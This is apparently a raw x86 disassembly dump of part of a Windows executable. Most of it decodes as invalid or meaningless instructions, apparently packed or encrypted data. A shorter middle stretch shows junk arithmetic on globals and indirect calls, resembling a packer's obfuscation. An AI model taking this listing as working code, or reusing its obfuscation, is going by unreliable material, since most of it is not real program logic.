  4032a2:	bound  ebx,QWORD PTR [ecx+0x21]
  4032a5:	les    eax,FWORD PTR [ebp+0x7eb3e62d]
  4032ab:	xchg   edx,eax
  4032ac:	xor    dl,ch
  4032ae:	add    bh,BYTE PTR [esi-0x3b4b5d9f]
  4032b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b5:	pop    ebp
  4032b6:	sub    DWORD PTR [esp+ebp*4-0x21],ebp
  4032ba:	stos   DWORD PTR es:[edi],eax
  4032bb:	arpl   WORD PTR [esi],ax
  4032bd:	mov    esp,0x86d7742c
  4032c2:	mov    ah,0xa2
  4032c4:	inc    ebx
  4032c5:	lock in al,dx
  4032c7:	xchg   edi,eax
  4032c8:	jecxz  0x403338
  4032ca:	or     BYTE PTR [ebp+0x61],ch
  4032cd:	addr16 jge 0x403295
  4032d0:	outs   dx,DWORD PTR ds:[esi]
  4032d1:	pushf  
  4032d2:	xor    bl,al
  4032d4:	dec    eax
  4032d5:	loopne 0x40326c
  4032d7:	es xchg ebp,eax
  4032d9:	xor    ah,dh
  4032db:	jp     0x4032e2
  4032dd:	sbb    bh,BYTE PTR [edi-0x41]
  4032e0:	iret   
  4032e1:	mov    edi,0x9e6cb9b
  4032e6:	or     eax,0x606ccef1
  4032eb:	mov    esi,0x499aa0b3
  4032f0:	sbb    edi,DWORD PTR [edx+0x2a]
  4032f3:	or     eax,0x7a19281c
  4032f8:	lahf   
  4032f9:	adc    eax,DWORD PTR [esi]
  4032fb:	sbb    eax,0x7b86202f
  403300:	stos   DWORD PTR es:[edi],eax
  403301:	imul   ecx,esi,0xeeb54796
  403307:	(bad)  
  403308:	add    DWORD PTR [esi],eax
  40330a:	add    esi,DWORD PTR [esi-0x65]
  40330d:	out    dx,eax
  40330e:	aad    0xd3
  403310:	in     eax,0xba
  403312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403313:	test   BYTE PTR ds:0xcfaefd0e,ch
  403319:	repnz pop edx
  40331b:	cmp    esp,DWORD PTR [edx-0x2cf118de]
  403321:	inc    esi
  403322:	xor    al,0x26
  403324:	inc    edi
  403325:	scas   eax,DWORD PTR es:[edi]
  403326:	pop    es
  403327:	cmp    eax,0xd9712b3a
  40332c:	mov    bh,0x9c
  40332e:	prefetch BYTE PTR cs:[edx+esi*2-0x42]
  403334:	retf   0x662c
  403337:	popf   
  403338:	push   esp
  403339:	xor    BYTE PTR [eax+0x2af80d0e],bl
  40333f:	xchg   edi,eax
  403340:	cmp    bh,BYTE PTR [ebx-0x4b08555b]
  403346:	pop    esp
  403347:	xor    al,0xd
  403349:	fisttp WORD PTR ds:0xddfbf5a7
  40334f:	shl    BYTE PTR [ebx-0x42],1
  403352:	xchg   edi,eax
  403353:	push   0x73a98b28
  403358:	fs push ds
  40335a:	xchg   edi,eax
  40335b:	jae    0x4033a9
  40335d:	xchg   esi,eax
  40335e:	rol    DWORD PTR [edi],0x2d
  403361:	mov    cl,0x82
  403363:	pop    ecx
  403364:	jns    0x4033a9
  403366:	repnz mov bl,0xe5
  403369:	jbe    0x4033b0
  40336b:	ret    
  40336c:	ret    
  40336d:	add    al,0x84
  40336f:	jl     0x40334a
  403371:	daa    
  403372:	rcr    DWORD PTR [edi+0x33],1
  403375:	push   ebx
  403376:	inc    eax
  403377:	jle    0x40338d
  403379:	sbb    al,0x2d
  40337b:	cs mov bh,0xe4
  40337e:	mov    DWORD PTR [esi+0x59b43f44],edx
  403384:	sahf   
  403385:	std    
  403386:	or     edx,DWORD PTR [ecx]
  403388:	cwde   
  403389:	jbe    0x403366
  40338b:	in     al,0xc0
  40338d:	dec    ecx
  40338e:	or     BYTE PTR [edi-0x7ffa867e],dh
  403394:	(bad)
  403398:	mov    cs,WORD PTR [edx-0x1b068192]
  40339e:	gs mov ebp,0x40cb189a
  4033a4:	popf   
  4033a5:	retf   
  4033a6:	sbb    ch,BYTE PTR [edi*2+0x30344c5b]
  4033ad:	ss pop ebp
  4033af:	and    BYTE PTR [esi-0x5d],bh
  4033b2:	shl    BYTE PTR [esi],1
  4033b4:	aam    0xad
  4033b6:	call   0x5761:0x40aaa9bc
  4033bd:	pop    edx
  4033be:	mov    dh,0x2f
  4033c0:	inc    BYTE PTR ds:[eax+0x62]
  4033c4:	retf   0xcbf7
  4033c7:	and    eax,0x369e853
  4033cc:	jmp    0x403350
  4033ce:	scas   eax,DWORD PTR es:[edi]
  4033cf:	int3   
  4033d0:	test   eax,0xa5990f0d
  4033d5:	int    0x4a
  4033d7:	ins    BYTE PTR es:[edi],dx
  4033d8:	ror    cl,0x98
  4033db:	push   ss
  4033dc:	rcr    al,cl
  4033de:	push   esp
  4033df:	scas   al,BYTE PTR es:[edi]
  4033e0:	adc    al,0x6b
  4033e2:	fisub  DWORD PTR [eax-0x4b]
  4033e5:	test   cl,ah
  4033e7:	stc    
  4033e8:	das    
  4033e9:	push   ds
  4033ea:	mov    DWORD PTR [eax+0x4537cbbb],eax
  4033f0:	sti    
  4033f1:	pusha  
  4033f2:	loope  0x403382
  4033f4:	jo     0x40338f
  4033f6:	stos   BYTE PTR es:[edi],al
  4033f7:	idiv   DWORD PTR [ecx+0x3fb1505f]
  4033fd:	(bad)  [esi+0x3e]
  403400:	call   0x487c1154
  403405:	lds    ebx,FWORD PTR [esi+0x753b8d9e]
  40340b:	int3   
  40340c:	cmc    
  40340d:	inc    esi
  40340e:	push   edx
  40340f:	test   eax,0x7e5ce98b
  403414:	or     al,0x93
  403416:	dec    esp
  403417:	pop    es
  403418:	cmp    esp,ebx
  40341a:	xlat   BYTE PTR ds:[ebx]
  40341b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40341c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40341d:	mov    ebp,0x79c0e82b
  403422:	push   edx
  403423:	add    cl,BYTE PTR [edx]
  403425:	out    0xa8,eax
  403427:	lock repnz mov dh,0x97
  40342b:	arpl   WORD PTR [esi+ebp*4+0x75],dx
  40342f:	lock adc BYTE PTR [ebx],0xbe
  403433:	popa   
  403434:	mov    al,ds:0xa1351a5c
  403439:	scas   al,BYTE PTR es:[edi]
  40343a:	gs sub eax,0x39293e4c
  403440:	cs jns 0x40343c
  403443:	cli    
  403444:	cs cwde 
  403446:	test   eax,0xeb21719f
  40344b:	(bad)  
  40344d:	test   BYTE PTR [edx+0x49],ah
  403450:	xlat   BYTE PTR ds:[ebx]
  403451:	(bad)  
  403452:	and    ecx,DWORD PTR [ebx]
  403454:	in     al,0xa3
  403456:	call   0x8f34d142
  40345b:	cwde   
  40345c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40345d:	mov    esi,fs
  40345f:	adc    BYTE PTR [ecx],ch
  403461:	sub    al,0x12
  403463:	hlt    
  403464:	add    al,BYTE PTR [ecx+eax*2]
  403467:	xchg   ebp,eax
  403468:	xchg   ecx,eax
  403469:	ins    BYTE PTR es:[edi],dx
  40346a:	sbb    eax,0x5a431004
  40346f:	lods   eax,DWORD PTR ds:[esi]
  403470:	fcmovnbe st,st(2)
  403472:	lock sbb eax,0x9396ec3f
  403478:	(bad)  
  403479:	shr    DWORD PTR [ebp-0x6f35163f],0x95
  403480:	popa   
  403481:	lods   eax,DWORD PTR ds:[esi]
  403482:	jb     0x403458
  403484:	cmp    al,0x89
  403486:	(bad)  
  403487:	fnstcw WORD PTR ds:0x91243a14
  40348d:	imul   DWORD PTR [ebp-0x65c1b66e]
  403493:	and    BYTE PTR [eax],bl
  403495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403496:	stos   BYTE PTR es:[edi],al
  403497:	imul   ebx,DWORD PTR [ebx-0x53585ae9],0x51f56d82
  4034a1:	inc    esp
  4034a2:	cmp    esp,DWORD PTR [esi+0x6c]
  4034a5:	xchg   ecx,eax
  4034a6:	jecxz  0x403512
  4034a8:	into   
  4034a9:	xor    eax,0x83a25cab
  4034ae:	push   ss
  4034af:	loopne 0x403514
  4034b1:	dec    eax
  4034b2:	cs push ds
  4034b4:	sbb    edx,DWORD PTR [edi+eax*4]
  4034b7:	and    BYTE PTR [ecx-0x4a],0xee
  4034bb:	add    DWORD PTR ds:0x99f912f3,edx
  4034c1:	xchg   ebx,eax
  4034c2:	jmp    0xa1fd9fb3
  4034c7:	daa    
  4034c8:	sub    eax,ebx
  4034ca:	icebp  
  4034cb:	adc    edi,DWORD PTR [bx+0x47]
  4034cf:	add    esp,ebp
  4034d1:	retf   0x1627
  4034d4:	loopne 0x4034a9
  4034d6:	push   esi
  4034d7:	jae    0x403476
  4034d9:	jecxz  0x403488
  4034db:	rol    BYTE PTR [edx-0x61],0x80
  4034df:	jle    0x40352b
  4034e1:	inc    ebx
  4034e2:	ror    bh,cl
  4034e4:	fst    QWORD PTR [esi]
  4034e6:	jb     0x40353d
  4034e8:	or     BYTE PTR [edi],0x6b
  4034eb:	ror    BYTE PTR [ebx+ecx*4],1
  4034ee:	dec    ebp
  4034ef:	in     al,dx
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428143,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x31],ch
  403514:	ins    DWORD PTR es:[edi],dx
  403515:	(bad)  
  403516:	mov    esi,0x1818e5c3
  40351b:	sahf   
  40351c:	adc    bl,BYTE PTR [eax]
  40351e:	sbb    BYTE PTR [ecx],ah
  403520:	mov    dh,BYTE PTR [ebx+0x379e47f8]
  403526:	cmp    eax,esi
  403528:	loop   0x4035a3
  40352a:	in     eax,dx
  40352b:	shl    ebp,0x81
  40352e:	retf   0xc09
  403531:	cmp    esi,DWORD PTR [ecx]
  403533:	xchg   DWORD PTR [edx+0x1],edx
  403536:	arpl   WORD PTR [edx-0x14],si
  403539:	mov    bl,0x5c
  40353b:	data16 daa 
  40353d:	pop    eax
  40353e:	in     eax,dx
  40353f:	fbstp  TBYTE PTR [ebx+ecx*2+0xf]
  403543:	cmp    ecx,DWORD PTR [edi+0x28]
  403546:	xor    ebp,ebx
  403548:	mov    al,0x88
  40354a:	or     eax,0xcf398103
  40354f:	jbe    0x4034fa
  403551:	adc    ecx,DWORD PTR [ebx-0x3f6fa469]
  403557:	push   ebp
  403558:	dec    esi
  403559:	into   
  40355a:	fisub  WORD PTR [edx]
  40355c:	repz mov cl,0xdc
  40355f:	stos   BYTE PTR es:[edi],al
  403560:	cwde   
  403561:	pmaddwd mm3,QWORD PTR [ecx+0x1d2f71bc]
  403568:	sbb    BYTE PTR [eax-0x3cb490aa],bl
  40356e:	movzx  ebp,BYTE PTR [esi+0x46]
  403572:	mov    esp,0x6766dadf
  403577:	icebp  
  403578:	inc    edx
  403579:	out    0x58,eax
  40357b:	sbb    DWORD PTR [ebp+0x59aa455c],0x248c211f
  403585:	jmp    0x5d91:0x28ad2bff
  40358c:	mov    esp,0x3d11c7e9
  403591:	mov    WORD PTR [esp+edx*1-0x5a],gs
  403595:	adc    ah,BYTE PTR [ebx-0x588cf7e1]
  40359b:	sbb    eax,0xd3945cee
  4035a0:	cld    
  4035a1:	shl    BYTE PTR ds:0x8b5da4c6,1
  4035a7:	add    BYTE PTR [eax+0x667d7b82],dh
  4035ad:	xchg   BYTE PTR ds:0x41a9db6d,bl
  4035b3:	fnsave [eax]
  4035b5:	mov    al,ds:0x9e99b8e
  4035ba:	outs   dx,DWORD PTR ds:[esi]
  4035bb:	int3   
  4035bc:	jb     0x403624
  4035be:	test   al,0xc3
  4035c0:	shl    ebp,0xc6
  4035c3:	lods   eax,DWORD PTR ds:[esi]
  4035c4:	jg     0x403631
  4035c6:	adc    ah,BYTE PTR [edx]
  4035c8:	sbb    bl,BYTE PTR [esi]
  4035ca:	iret   
  4035cb:	mov    ds:0x3ff77c35,al
  4035d0:	sbb    al,0xb3
  4035d2:	aad    0x1
  4035d4:	test   ecx,edx
  4035d6:	mov    esp,0x744b4cf3
  4035db:	stc    
  4035dc:	push   esp
  4035dd:	rcr    DWORD PTR [eax-0x77d4b3db],0x23
  4035e4:	inc    esp
  4035e5:	and    al,0x79
  4035e7:	mov    edx,0x28c11257
  4035ec:	xchg   BYTE PTR [edx],ah
  4035ee:	aaa    
  4035ef:	iret   
  4035f0:	jmp    FWORD PTR [edx]
  4035f2:	push   edi
  4035f3:	xchg   ecx,eax
  4035f4:	scas   al,BYTE PTR es:[edi]
  4035f5:	pop    ss
  4035f6:	pushf  
  4035f7:	cli    
  4035f8:	mov    ecx,0xbcc0b395
  4035fd:	mov    al,0xf1
  4035ff:	fstp   TBYTE PTR ds:0xf8b87ca8
  403605:	pop    ecx
  403606:	jle    0x403678
  403608:	je     0x4035d0
  40360a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40360b:	cld    
  40360c:	es mov ecx,0xe11eccc6
  403612:	inc    edi
  403613:	data16 fistp DWORD PTR [ebp+edx*8+0x6e]
  403618:	lahf   
  403619:	jbe    0x40368d
  40361b:	inc    esi
  40361c:	mov    bl,0x69
  40361e:	cld    
  40361f:	mov    esi,0x501c691c
  403624:	jl     0x4036a4
  403626:	push   es
  403627:	mov    esp,0x4c228086
  40362c:	retf   0x77bc
  40362f:	sub    eax,0xb0372921
  403634:	or     eax,0xc9f9acd0
  403639:	fst    QWORD PTR [ecx]
  40363b:	jns    0x4036af
  40363d:	add    al,0xbb
  40363f:	mul    DWORD PTR ds:0xb2ae61c9
  403645:	stos   BYTE PTR es:[edi],al
  403646:	mov    esi,0x11709081
  40364b:	ret    
  40364c:	fcom   QWORD PTR [ebx+0x602f4717]
  403652:	or     eax,0x306a7534
  403657:	adc    edi,ebp
  403659:	dec    edi
  40365a:	dec    eax
  40365b:	ds pop eax
  40365d:	div    dh
  40365f:	mov    cl,0xee
  403661:	and    al,0x38
  403663:	cdq    
  403664:	test   eax,0x68e121ec
  403669:	in     al,0x3
  40366b:	addr16 pushf 
  40366d:	(bad)  
  40366e:	popf   
  40366f:	mov    es,WORD PTR [eax-0x54a65dea]
  403675:	leave  
  403676:	test   al,0xc
  403678:	fcmovb st,st(5)
  40367a:	mov    edx,0x283cd940
  40367f:	out    0xd7,al
  403681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403682:	rcl    BYTE PTR [edi-0xf],1
  403685:	test   eax,0xf9f6a838
  40368a:	cmp    ebx,DWORD PTR [esi+0xe]
  40368d:	mov    ebx,0x9e2b4be6
  403692:	pop    ss
  403693:	js     0x403617
  403695:	int3   
  403696:	out    0x84,eax
  403698:	ja     0x403681
  40369a:	sub    dl,BYTE PTR [ecx-0x70c9592a]
  4036a0:	mov    ch,0xd6
  4036a2:	sub    DWORD PTR [ebp+ecx*1-0x62b699bf],ebp
  4036a9:	gs or  eax,0xdb098cd2
  4036af:	mov    al,ds:0xfb212065
  4036b4:	ins    DWORD PTR es:[edi],dx
  4036b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b6:	adc    eax,0xe5f70e24
  4036bb:	rol    BYTE PTR [eax],cl
  4036bd:	xchg   ebx,eax
  4036be:	pop    es
  4036bf:	fwait
  4036c0:	pop    edx
  4036c1:	(bad)  
  4036c2:	fmulp  st(0),st
  4036c4:	cmp    eax,0x88ba45fd
  4036c9:	mov    ebp,0xedbda55d
  4036ce:	out    0xf6,al
  4036d0:	jae    0x4036fa
  4036d2:	ins    DWORD PTR es:[edi],dx
  4036d3:	jns    0x4036ae
  4036d5:	adc    BYTE PTR [edx+0x56008be4],ah
  4036db:	fsub   QWORD PTR [ebx]
  4036dd:	jns    0x40372f
  4036df:	ins    DWORD PTR es:[edi],dx
  4036e0:	inc    ebp
  4036e1:	loope  0x403668
  4036e3:	popa   
  4036e4:	fidivr DWORD PTR [esi]
  4036e6:	and    dh,BYTE PTR [ecx+esi*1]
  4036e9:	popa   
  4036ea:	dec    BYTE PTR [edx]
  4036ec:	sti    
  4036ed:	popf   
  4036ee:	jo     0x403755
  4036f0:	cdq    
  4036f1:	jg     0x403682
  4036f3:	xchg   esi,eax
  4036f4:	jp     0x403741
  4036f6:	mov    WORD PTR [ebx-0x20],ds
  4036f9:	lock out 0xa5,al
  4036fc:	jl     0x4036a8
  4036fe:	das    
  4036ff:	loop   0x4036ca
  403701:	and    DWORD PTR [esi+0x2cf432e2],esi
  403707:	(bad)  
  403708:	and    BYTE PTR [ebx+0xf6f8b1d],al
  40370e:	int    0xaf
  403710:	pushf  
  403711:	sbb    al,cl
  403713:	jbe    0x403701
  403715:	ret    
  403716:	mov    edx,0x41b3a264
  40371b:	cs inc edi
  40371d:	or     DWORD PTR [ecx+0x4557f4dc],0xffffffb4
  403724:	add    cl,BYTE PTR [ebx+0x75]
  403727:	or     ebx,DWORD PTR [edi+0x495489f1]
  40372d:	pushf  
  40372e:	xor    bh,dl
  403730:	or     BYTE PTR [ebx-0x74],bh
  403733:	mov    esi,0xc1fc8d6d
  403738:	dec    ecx
  403739:	and    DWORD PTR [edi+edi*1],ebp
  40373c:	test   al,0xdd
  40373e:	cld    
  40373f:	cdq    
  403740:	dec    esp
  403741:	jmp    WORD PTR ds:0x94fa53f2
  403748:	and    al,0x47
  40374a:	mov    ds:0x436bc569,eax
  40374f:	sbb    BYTE PTR [edx],al
  403751:	xchg   edi,eax
  403752:	shl    DWORD PTR [ecx+0x78],0x39
  403756:	(bad)  
  403757:	(bad)  
  403758:	retf   
  403759:	adc    cl,0x9
  40375c:	and    dl,BYTE PTR [edi-0x486a6572]
  403762:	push   es
  403763:	sahf   
  403764:	push   0x7a1be9d0
  403769:	and    DWORD PTR [ecx-0x77],ebx
  40376c:	jns    0x40379a
  40376e:	pop    ss
  40376f:	jmp    0xaf98:0x3fc607d
  403776:	mov    eax,ds:0xa1fdf413
  40377b:	ja     0x40376e
  40377d:	outs   dx,DWORD PTR ds:[esi]
  40377e:	mov    eax,ds:0x47966eea
  403783:	jecxz  0x403743
  403785:	jns    0x40374b
  403787:	dec    esp
  403788:	test   ebp,edx
  40378a:	fwait
  40378b:	lock sbb ecx,DWORD PTR [eax]
  40378e:	jae    0x403750
  403790:	push   edx
  403791:	aas    
  403792:	lods   al,BYTE PTR ds:[esi]
  403793:	lahf   
  403794:	cdq    
  403795:	jnp    0x403739
  403797:	retf   0xaf43
  40379a:	dec    BYTE PTR [ebx+esi*4-0x4d]
  40379e:	mov    ecx,0x3eb2448f
  4037a3:	xor    eax,0xf06d6b99
  4037a8:	cmp    BYTE PTR [ebp+0x4b57c383],ch
  4037ae:	cmp    BYTE PTR [edx],bh
  4037b0:	jmp    DWORD PTR [ecx+0x4a5dbe93]
  4037b6:	pushf  
  4037b7:	fnstsw WORD PTR [eax+0x3a]
  4037ba:	aam    0x60
  4037bc:	dec    ecx
  4037bd:	mov    ecx,edi
  4037bf:	popa   
  4037c0:	(bad)
  4037c3:	pop    esi
  4037c4:	popf   
  4037c5:	inc    DWORD PTR [ecx]
  4037c7:	outs   dx,DWORD PTR ds:[esi]
  4037c8:	inc    bp
  4037ca:	add    al,0x94
  4037cc:	xchg   BYTE PTR [eax],ch
  4037ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037cf:	mov    dl,al
  4037d1:	in     al,0x2f
  4037d3:	loop   0x403827
  4037d5:	and    al,0x9b
  4037d7:	test   cl,al
  4037d9:	out    0xfe,eax
  4037db:	pop    ebx
  4037dc:	mov    edi,0xe0495879
  4037e1:	sbb    esi,ecx
  4037e3:	jge    0x4037ca
  4037e5:	fwait
  4037e6:	jb     0x403770
  4037e8:	and    BYTE PTR [eax-0x4bb4ae54],0xc
  4037ef:	or     al,0xe3
  4037f1:	cmc    
  4037f2:	lods   eax,DWORD PTR ds:[esi]
  4037f3:	fsubr  DWORD PTR [esp+eiz*2+0x5250e01b]
  4037fa:	push   ecx
  4037fb:	int3   
  4037fc:	or     al,0x35
  4037fe:	repnz pop esi
  403800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403801:	retf   0x33eb
  403804:	(bad)  
  403805:	jmp    0x4dd1d8e6
  40380a:	ror    DWORD PTR [esi+0x61],0xbf
  40380e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40380f:	(bad)  
  403811:	(bad)  
  403812:	shl    DWORD PTR [esp+edi*2-0x4e],1
  403816:	lds    ebx,FWORD PTR [ebp-0x2c553921]
  40381c:	mov    ebx,0x1d7776c7
  403821:	ret    
  403822:	neg    bh
  403824:	sbb    al,0x73
  403826:	out    dx,eax
  403827:	enter  0x192b,0x82
  40382b:	test   al,0x8a
  40382d:	sbb    BYTE PTR [ebp+0x7],al
  403830:	add    al,0x7e
  403832:	sub    dl,al
  403834:	xchg   BYTE PTR [ebx],bl
  403836:	adc    DWORD PTR [ebx-0x31],0xd0155b8
  40383d:	jle    0x4037c1
  40383f:	sub    DWORD PTR [edx-0x6520f33a],0x4de3e01b
  403849:	dec    edx
  40384a:	fadd   QWORD PTR [eax-0x4ba9edaa]
  403850:	mov    eax,0xf7a2cb7c
  403855:	hlt    
  403856:	and    DWORD PTR [edi],ebp
  403858:	jecxz  0x403824
  40385a:	pop    ds
  40385b:	leave  
  40385c:	add    DWORD PTR [ebp-0x59],edi
  40385f:	bound  esi,QWORD PTR [ebx]
  403861:	mov    gs,WORD PTR [eax-0x6d4633c4]
  403867:	dec    eax
  403868:	loopne 0x4038cd
  40386a:	cmp    ecx,DWORD PTR ds:0x9b74f89b
  403870:	in     eax,0x9d
  403872:	dec    ebp
  403873:	xor    cl,dh
  403875:	cli    
  403876:	push   ecx
  403877:	inc    eax
  403878:	and    edi,DWORD PTR [eax+ecx*1]
  40387b:	mov    esi,0x95e5bac5
  403880:	in     eax,0xaa
  403882:	xor    bl,BYTE PTR ds:0xcfbd0c1f
  403888:	sub    al,0xb5
  40388a:	cmp    bh,BYTE PTR [esi+0x61df9801]
  403890:	or     eax,0x6dfad995
  403895:	add    DWORD PTR [esi+0x3589a73e],esp
  40389b:	and    al,0x1a
  40389d:	mov    eax,esp
  40389f:	xchg   esi,eax
  4038a0:	(bad)  
  4038a1:	xor    ebp,DWORD PTR [edx]
  4038a3:	ins    DWORD PTR es:[edi],dx
  4038a4:	out    dx,al
  4038a5:	sub    ebx,esi
  4038a7:	sub    BYTE PTR [eax+0x43],cl
  4038aa:	cli    
  4038ab:	xchg   BYTE PTR [edi],al
  4038ad:	pop    ebp
  4038ae:	jmp    0x1fb2:0xb9d424d1
  4038b5:	inc    ebp
  4038b6:	sub    dl,dl
  4038b8:	or     ch,BYTE PTR [ebp-0x66]
  4038bb:	daa    
  4038bc:	inc    eax
  4038bd:	add    BYTE PTR [edx+0xd],ch
  4038c0:	sti    
  4038c1:	fwait
  4038c2:	sub    ebx,esp
  4038c4:	std    
  4038c5:	mov    edx,0xeebd6bbb
  4038ca:	std    
  4038cb:	ret    0xbd68
  4038ce:	stc    
  4038cf:	ret    0xc46b
  4038d2:	stos   DWORD PTR es:[edi],eax
  4038d3:	jmp    0x1770b39a
  4038d8:	xchg   edx,eax
  4038d9:	xchg   esi,eax
  4038da:	push   ebx
  4038db:	sbb    ebx,DWORD PTR [ecx-0x6c]
  4038de:	add    al,0xd1
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	cmp    DWORD PTR ds:0x428243,0x0
  4038ea:	not    DWORD PTR ds:0x42813b
  4038f0:	mov    ecx,DWORD PTR ds:0x428267
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428243,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428eb8
  403913:	xor    edx,DWORD PTR ds:0x42822f
  403919:	neg    DWORD PTR ds:0x428243
  40391f:	xor    DWORD PTR ds:0x428137,0x12a5
  403929:	and    DWORD PTR ds:0x428387,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42826b
  403939:	or     ecx,DWORD PTR ds:0x42821f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428143,0x0
  403949:	mov    DWORD PTR ds:0x428387,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428143,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428d8c
  40397f:	adc    DWORD PTR ds:0x428277,0x42815f
  403989:	sbb    DWORD PTR ds:0x428263,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428363
  403999:	or     DWORD PTR ds:0x42823f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428267
  4039a7:	adc    edx,DWORD PTR ds:0x42824b
  4039ad:	mov    DWORD PTR ds:0x428267,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42821f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x428287,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42827b,0x428387
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42815b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428137,0x4282ff
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428143,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42813b,0x4282d3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42824f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428267,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428137,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428263,0x0
  403a3e:	mov    DWORD PTR ds:0x4282ef,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x428387
  403a57:	cmp    DWORD PTR ds:0x428263,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d68
  403a6f:	mov    edx,DWORD PTR ds:0x42831f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x4283b3
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428163,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428157,0x2089
  403aa2:	or     DWORD PTR ds:0x42813b,0x113b
  403aac:	mov    eax,ds:0x4223b0
  403ab1:	cmp    DWORD PTR ds:0x428163,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42822f
  403ac3:	mov    DWORD PTR ds:0x428213,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428303,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428163,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428163,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428103
  403af8:	call   DWORD PTR ds:0x428d90
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42822b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42826f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42835b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42814b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0x6a067284
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0xf181812],bl
  403b4b:	jbe    0x403b24
  403b4d:	sub    BYTE PTR [ebx],al
  403b4f:	scas   al,BYTE PTR es:[edi]
  403b50:	hlt    
  403b51:	outs   dx,BYTE PTR ds:[esi]
  403b52:	mov    ?,ebp
  403b54:	(bad)  
  403b55:	out    0xdf,eax
  403b57:	inc    ebp
  403b58:	add    esi,edx
  403b5a:	jmp    0x47:0x1b6cd76
  403b61:	mov    al,0x90
  403b63:	fnstenv [esi+0xd651a75]
  403b69:	stos   BYTE PTR es:[edi],al
  403b6a:	loope  0x403bb4
  403b6c:	or     DWORD PTR [ecx],edi
  403b6e:	cmp    ch,BYTE PTR [edi+0xe25fe81]
  403b74:	xor    al,0x1d
  403b76:	mov    ch,0xf4
  403b78:	mov    ecx,0x35407a3b
  403b7d:	push   esi
  403b7e:	push   ebp
  403b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b80:	loopne 0x403b7c
  403b82:	mov    edx,0x85c4aaed
  403b87:	ret    0x3746
  403b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b8b:	loopne 0x403b6b
  403b8d:	bound  esp,QWORD PTR [ebp-0xc]
